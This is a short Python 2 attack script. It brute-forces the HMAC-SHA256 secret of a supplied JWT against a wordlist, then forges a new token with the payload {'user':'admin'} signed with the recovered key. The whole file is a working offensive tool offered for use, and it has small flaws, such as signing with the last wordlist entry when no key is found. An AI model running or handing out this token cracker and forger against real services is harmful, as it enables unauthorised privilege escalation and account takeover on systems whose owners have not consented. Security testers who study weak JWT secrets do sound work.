#!usr/bin/python2
import hmac
import hashlib
import base64
import sys
####################
# @saravana_seeker #
##################

#paste the jwt token
#and change the wordlist also

jwt=sys.argv[1]

h,p,s=jwt.split('.')

def sign(data,key):
	return base64.urlsafe_b64encode(hmac.new(key,data,hashlib.sha256).digest()).decode('utf8').rstrip("=")

file=open(sys.argv[2],'r').readlines()

for line in file:
	key=line.strip()
	m=sign(h+"."+p,key)
	if m==s:
		print("cracked-key-is:"+key)
		key=key



p="{\"user\":\"admin\"}"
py= base64.urlsafe_b64encode(p).strip('=')
print(py)

payload=sign(h+"."+py,key)

print("your-payload-Is:"+h+"."+py+"."+payload)
	

